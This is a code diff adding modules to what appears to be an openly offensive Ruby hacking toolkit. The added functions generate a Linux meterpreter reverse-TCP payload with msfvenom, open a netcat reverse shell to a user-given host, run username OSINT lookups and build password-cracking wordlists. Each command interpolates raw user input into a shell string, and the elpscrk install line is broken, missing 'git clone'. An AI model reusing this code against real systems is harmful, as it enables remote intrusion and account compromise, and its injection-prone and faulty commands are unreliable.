@@ -73,6 +73,21 @@ def mpwindowsreversetcp
     puts "Payload created!"
 end
 
+def mplinuxreversetcp
+    puts "Enter LHOST"
+    print " > "
+    lhost = gets.chomp
+    puts "Enter LPORT"
+    print " > "
+    lport = gets.chomp
+    puts "Enter output name (no .elf for example. /home/user/Desktop/payload)"
+    print " > "
+    output = gets.chomp
+    puts "Creating payload..."
+    system("msfvenom --platform Linux --arch x86 -p linux/x86/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} R > #{output}.elf")
+    puts "Payload created!"
+end
+
 def mpphpreversetcp
     puts "Enter LHOST"
     print " > "
@@ -128,4 +143,100 @@ def osdetect
     ip = gets.chomp
     puts "Starting scan..."
     system("nmap -O #{ip}")
+end
+
+# netcat modules
+
+def reverseshelllinux
+    puts "Enter LHOST"
+    print " > "
+    lhost = gets.chomp
+    puts "Enter LPORT"
+    print " > "
+    lport = gets.chomp
+    puts "Starting reverse shell..."
+    system("nc -e /bin/sh #{lhost} #{lport}")
+end 
+
+# osint modules
+
+def osintsherlock
+    if File.exist?('./scripts/sherlock/sherlock/sherlock.py')
+        puts "Enter username to search for"
+        print " > "
+        username = gets.chomp
+        puts "Searching..."
+        system("python3 ./scripts/sherlock/sherlock/sherlock.py #{username}")
+    else
+        puts "Sherlock not found. Do you want to install it? (y/n)"
+        print " > "
+        install = gets.chomp
+        if install == "y"
+            puts "Installing Sherlock..."
+            system("git clone https://github.com/sherlock-project/sherlock.git ./scripts/sherlock")
+            system("pip3 install -r ./scripts/sherlock/requirements.txt")
+            puts "Sherlock installed!"
+            puts "Use the command again to use Sherlock"
+        else
+            puts "Exiting..."
+        end
+    end
+end
+
+# misc modules
+def elpscrk
+    if File.exist?('./scripts/elpscrk/elpscrk.py')
+        puts "Enter password level: (1-5, check elpscrk docs for more info)"
+        print " > "
+        level = gets.chomp
+        puts "Enter minimum password length"
+        print " > "
+        min = gets.chomp
+        puts "Enter maximum password length"
+        print " > "
+        max = gets.chomp
+        system("python3 ./scripts/elpscrk/elpscrk.py --level #{level} --min #{min} --max #{max}")
+    else
+        puts "elpscrk not found. Do you want to install it? (y/n)"
+        print " > "
+        install = gets.chomp
+        if install == "y"
+            puts "Installing Elpscrk..."
+            system("https://github.com/D4Vinci/elpscrk.git ./scripts/elpscrk")
+            system("pip3 install -r ./scripts/elpscrk/requirements.txt")
+            puts "Elpscrk installed!"
+            puts "Use the command again to use Elpscrk"
+        else
+            puts "Exiting..."
+        end
+    end
+end
+
+def elpscrkleet
+    if File.exist?('./scripts/elpscrk/elpscrk.py')
+        puts "Note: you are in leet mode. this will make from 'password' to 'p4ssw0rd'"
+        puts "Enter password level: (1-5, check elpscrk docs for more info)"
+        print " > "
+        level = gets.chomp
+        puts "Enter minimum password length"
+        print " > "
+        min = gets.chomp
+        puts "Enter maximum password length"
+        print " > "
+        max = gets.chomp
+        system("python3 ./scripts/elpscrk/elpscrk.py --leet --level #{level} --min #{min} --max #{max}")
+    else
+        puts "elpscrk not found. Do you want to install it? (y/n)"
+        print " > "
+        install = gets.chomp
+        if install == "y"
+            puts "Installing Elpscrk..."
+            system("https://github.com/D4Vinci/elpscrk.git ./scripts/elpscrk")
+            system("pip3 install -r ./scripts/elpscrk/requirements.txt")
+            puts "Elpscrk installed!"
+            puts "Use the command again to use Elpscrk"
+        else
+            puts "Exiting..."
+        end
+    end
 end
